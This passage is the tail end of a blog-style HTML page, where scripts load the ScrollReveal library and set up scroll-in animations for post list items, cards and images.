</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>